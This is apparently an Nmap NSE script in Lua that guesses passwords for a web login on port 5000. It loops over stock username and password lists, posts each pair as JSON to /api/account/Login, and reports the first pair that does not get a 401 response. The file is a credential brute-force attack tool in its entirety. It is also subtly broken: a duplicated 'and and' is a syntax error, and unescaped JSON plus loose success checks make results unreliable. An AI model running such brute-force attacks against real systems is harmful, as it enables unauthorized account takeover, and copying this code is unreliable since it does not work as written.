description = [[
    Guesses password
]]

categories = {"intrusive", "auth"}

local http = require "http"
local unpwdb = require "unpwdb"

function portrule(host, port)
    return port.number == 5000
end

function action(host, port)
    local usernames, passwords
    local status

    status, usernames = unpwdb.usernames()
    if not status then
        return "Error loading usernames"
    end

    status, passwords = unpwdb.passwords()
    if not status then
        return "Error loading passwords"
    end

    for password in passwords do
        for username in usernames do
            local url = string.format("http://%s:%d/api/account/Login", host.ip, port.number)
            
            
            local json_body = string.format([[
                {
                    "email": "%s",
                    "password": "%s"
                }
            ]], username, password)

            local response = http.post(url, {
                headers = {
                    ["Content-Type"] = "application/json"
                },
                body = json_body
            })
            
            if response and and response.status ~= 401 then
                return username .. ":" .. password
            end
        end
        unpwdb.reset_usernames()
    end
    return "fail"
end
